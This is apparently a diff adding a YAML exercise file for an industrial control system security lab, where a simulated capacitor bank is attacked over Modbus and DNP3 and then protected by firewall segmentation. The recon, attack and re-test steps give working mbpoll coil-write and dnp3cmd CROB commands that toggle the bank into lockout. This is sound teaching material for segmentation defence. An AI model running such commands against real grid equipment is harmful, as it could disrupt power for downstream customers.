@@ -1,0 +1,221 @@
+id: capbank-switching-attack
+order: 7
+name: "Capacitor Bank Switching Attack (Bonus)"
+summary: "Optional — Rapid capacitor bank switching from Kali causes voltage transients and triggers a contact-wear lockout."
+description: >
+  An attacker on the enterprise network discovers an unprotected
+  capacitor bank controller on the field network. By rapidly
+  switching the bank in and out via Modbus or DNP3, the attacker
+  forces voltage transients on the feeder and exhausts the
+  switch-count limit, locking the capacitor bank out of service.
+  Without reactive power compensation the feeder voltage drops
+  under heavy load, degrading power quality for all downstream
+  customers.
+
+  This exercise demonstrates that even "passive" power system
+  assets like capacitor banks can be weaponized if segmentation
+  does not restrict access to SCADA-facing protocols. The
+  hardened containd policy blocks enterprise→field Modbus and
+  DNP3, which prevents the attack entirely.
+nodes:
+  - kali-1
+tags:
+  - modbus
+  - dnp3
+  - field-device
+  - offense
+  - segmentation
+  - bonus
+steps:
+  - title: "Verify normal operations"
+    description: >
+      Confirm all field devices are online and communicating
+      through the RTAC. The capacitor bank should be switched
+      out (de-energized) with auto mode enabled and no lockout.
+
+      Check capbank state via the RTAC REST API:
+
+        curl -s http://10.30.30.20:8080/api/tags | python3 -m json.tool | grep capbank
+
+      Or poll the capbank directly via Modbus from Kali:
+
+        mbpoll -m tcp -a 1 -r 1 -c 10 -1 -t 1 10.40.40.23
+
+      Or poll via DNP3:
+
+        dnp3poll 10.40.40.23:20000 -a 4
+
+      Binary Input [0] (switched_in) should be OFF, Binary
+      Input [2] (lockout) should be OFF.
+    action:
+      type: check
+      expect:
+        breaker_closed: true
+        recloser_closed: true
+        reclose_enabled: true
+
+  - title: "Reconnaissance — discover the capacitor bank"
+    description: >
+      From the Kali attacker box (10.10.10.50), scan the field
+      device subnet for Modbus and DNP3 services:
+
+        nmap -p 502,20000 10.40.40.20-23
+
+      Under the weak baseline, all four field devices respond
+      on both ports. The capacitor bank at 10.40.40.23 is the
+      target for this exercise.
+
+      Poll its Modbus holding registers to see the current state:
+
+        mbpoll -m tcp -a 1 -r 1 -c 10 -1 -t 1 10.40.40.23
+
+      And its DNP3 outstation to enumerate points:
+
+        dnp3poll 10.40.40.23:20000 -a 4
+
+      Note the switch_count (Analog Input [1]) — this tracks
+      how many times the bank has been switched. After 6
+      operations the controller locks out to protect the
+      vacuum contacts from wear.
+
+  - title: "Attack — rapid switching via Modbus"
+    description: >
+      From Kali, use mbpoll to write to the capbank's Modbus
+      coil register. The capbank-sim maps coil 0 to switch_in
+      (write 1 = switch in, write 0 = switch out).
+
+      Rapidly toggle the bank back and forth:
+
+        mbpoll -m tcp -a 1 -r 1 -t 0 -1 10.40.40.23 1
+        mbpoll -m tcp -a 1 -r 1 -t 0 -1 10.40.40.23 0
+        mbpoll -m tcp -a 1 -r 1 -t 0 -1 10.40.40.23 1
+        mbpoll -m tcp -a 1 -r 1 -t 0 -1 10.40.40.23 0
+        mbpoll -m tcp -a 1 -r 1 -t 0 -1 10.40.40.23 1
+        mbpoll -m tcp -a 1 -r 1 -t 0 -1 10.40.40.23 0
+
+      Each write increments the switch count. After 6 operations
+      the controller locks out and raises an alarm.
+
+      :::hint Why rapid switching matters
+      In a real substation, each capacitor bank switching event
+      creates an inrush current transient and a voltage step.
+      Rapid back-to-back switching can cause:
+
+      - **Voltage flicker** affecting sensitive loads
+      - **Vacuum interrupter wear** reducing contact life
+      - **Restrike risk** if the contacts haven't fully cleared
+      - **Protection misoperation** from transient currents
+
+      The switch-count lockout (6 operations in this sim) models
+      the real vendor limit that protects the hardware. Once
+      locked out, the bank cannot be re-energized without a
+      manual reset — which in a real substation requires a crew
+      dispatch.
+      :::
+    action:
+      type: command
+      device: capbank
+      command: switch_in
+      source: "10.10.10.50"
+
+  - title: "Observe impact"
+    description: >
+      The capacitor bank is now locked out. Check the state:
+
+        curl -s http://10.40.40.23:8080/api/state | python3 -m json.tool
+
+      Or via DNP3:
+
+        dnp3poll 10.40.40.23:20000 -a 4
+
+      You should see:
+
+      - `switched_in`: depends on where the toggle stopped
+      - `lockout`: true
+      - `alarm`: true
+      - `switch_count`: 6 (at the limit)
+
+      The RTAC audit log also records each switching event:
+
+        curl -s http://10.30.30.20:8080/api/audit | python3 -m json.tool | tail -30
+
+      Each entry shows the source as 10.10.10.50 (Kali) —
+      proof of unauthorized access from the enterprise zone.
+    action:
+      type: check
+      expect:
+        breaker_closed: true
+
+  - title: "Restore operations"
+    description: >
+      Reset the capacitor bank lockout and clear the alarm.
+      In a real substation this would require a crew dispatch;
+      in the lab we can reset via the RTAC command API:
+
+        curl -X POST http://10.30.30.20:8080/api/command/capbank \
+          -H 'Content-Type: application/json' \
+          -d '{"command":"reset_lockout","source":"operator"}'
+
+      Verify the lockout is cleared:
+
+        curl -s http://10.40.40.23:8080/api/state | python3 -m json.tool
+    action:
+      type: sequence
+      commands:
+        - device: capbank
+          command: reset_lockout
+          source: "operator"
+
+  - title: "Apply containd segmentation"
+    description: >
+      Apply the hardened firewall configuration via the
+      Segmentation Policy panel on the Network Map (or via the
+      containd Segmentation drawer). This blocks enterprise and
+      vendor zones from reaching field device Modbus (502) and
+      DNP3 (20000) ports. Only the RTAC is allowed.
+    action:
+      type: firewall
+      config: improved
+
+  - title: "Re-test attack"
+    description: >
+      From Kali, re-attempt the Modbus write:
+
+        mbpoll -m tcp -a 1 -r 1 -t 0 -1 10.40.40.23 1
+
+      The connection should time out — containd blocks
+      enterprise→field Modbus traffic on port 502.
+
+      Try DNP3 as well:
+
+        dnp3cmd 10.40.40.23:20000 -a 4 crob 0 latch-on
+
+      Also blocked. The capacitor bank is now protected by
+      zone-based segmentation.
+
+      Verify the bank is still in its last known state (not
+      switched by the attacker):
+
+        curl -s http://10.30.30.20:8080/api/tags | python3 -m json.tool | grep capbank
+    action:
+      type: command
+      device: capbank
+      command: switch_in
+      source: "10.10.10.50"
+
+  - title: "Validate segmentation"
+    description: >
+      Confirm that:
+
+      - The capacitor bank is not locked out
+      - The RTAC can still poll the bank (comms_ok = true)
+      - Enterprise→field Modbus and DNP3 are blocked
+      - The hardened firewall policy is active
+
+      The attack path from enterprise to the capacitor bank
+      is now closed. Only the RTAC — operating through the
+      firewall from its OT Ops interface — can switch the bank.
+    action:
+      type: check
+      expect:
+        firewall_config: improved
